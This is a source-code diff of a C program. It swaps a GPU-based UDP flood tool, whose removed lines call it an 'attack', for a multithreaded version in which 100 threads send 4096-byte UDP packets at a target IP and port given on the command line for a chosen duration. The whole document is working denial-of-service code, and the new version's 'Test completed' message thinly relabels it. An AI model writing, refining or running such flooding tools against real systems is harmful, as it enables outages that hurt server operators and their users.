@@ -1,62 +1,81 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <pthread.h>
 #include <string.h>
-#include <cuda_runtime.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
 #include <unistd.h>
+#include <arpa/inet.h>
+#include <time.h>
 
-#define PACKET_SIZE 1024  // 1KB UDP packet
-#define THREADS_PER_BLOCK 256  // Adjust based on GPU capability
+#define THREAD_COUNT 100
+#define PACKET_SIZE 4096  // Adjust based on your server’s capabilities
 
-// CUDA Kernel for sending UDP packets
-__global__ void udp_flood(char* target_ip, int target_port, int duration) {
+typedef struct {
+    char ip[16];  // Store IP as a string
+    int port;
+    int duration;
+} thread_data_t;
+
+void* send_powerful_traffic(void* arg) {
+    thread_data_t *data = (thread_data_t *)arg;
+    struct sockaddr_in server_addr;
     int sock;
-    struct sockaddr_in server;
     char packet[PACKET_SIZE];
+    time_t start_time = time(NULL);
 
-    memset(packet, 'A', PACKET_SIZE);  // Random data payload
+    // Fill the packet with random data
+    memset(packet, 'A', PACKET_SIZE);
 
-    // Setup target address
-    server.sin_family = AF_INET;
-    server.sin_port = htons(target_port);
-    server.sin_addr.s_addr = inet_addr(target_ip);
+    // Setup server address structure
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(data->port);
+    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);
 
-    // Open UDP socket
-    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock < 0) return;
+    // Create socket
+    sock = socket(AF_INET, SOCK_DGRAM, 0);  // UDP for high-speed traffic
+    if (sock < 0) {
+        perror("Socket creation failed");
+        pthread_exit(NULL);
+    }
 
-    long long start_time = clock64();
-    long long end_time = start_time + duration * 1000000000LL;  // Convert seconds to nanoseconds
-
-    while (clock64() < end_time) {
-        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
+    // Continuously send packets until the time runs out
+    while (time(NULL) - start_time < data->duration) {
+        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
     }
 
     close(sock);
+    pthread_exit(NULL);
 }
 
-// Host function to launch GPU threads
-void start_attack(char* target_ip, int target_port, int duration, int num_blocks) {
-    udp_flood<<<num_blocks, THREADS_PER_BLOCK>>>(target_ip, target_port, duration);
-    cudaDeviceSynchronize();
-}
-
-int main(int argc, char* argv[]) {
-    if (argc != 5) {
-        printf("Usage: %s <IP> <Port> <Duration (seconds)> <Blocks>\n", argv[0]);
-        return 1;
+int main(int argc, char *argv[]) {
+    if (argc != 4) {
+        printf("Usage: %s <IP> <Port> <Duration>\n", argv[0]);
+        return -1;
     }
 
-    char* target_ip = argv[1];
-    int target_port = atoi(argv[2]);
+    char *ip = argv[1];
+    int port = atoi(argv[2]);
     int duration = atoi(argv[3]);
-    int num_blocks = atoi(argv[4]);
 
-    printf("Starting CUDA UDP flood on %s:%d for %d seconds using %d blocks.\n", target_ip, target_port, duration, num_blocks);
+    pthread_t threads[THREAD_COUNT];
+    thread_data_t thread_data[THREAD_COUNT];
 
-    start_attack(target_ip, target_port, duration, num_blocks);
-    printf("Attack completed.\n");
+    // Create multiple threads with their own data
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        strncpy(thread_data[i].ip, ip, sizeof(thread_data[i].ip));
+        thread_data[i].port = port;
+        thread_data[i].duration = duration;
 
+        if (pthread_create(&threads[i], NULL, send_powerful_traffic, &thread_data[i]) != 0) {
+            perror("Thread creation failed");
+            return -1;
+        }
+    }
+
+    // Wait for all threads to finish
+    for (int i = 0; i < THREAD_COUNT; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("Test completed.\n");
     return 0;
 }
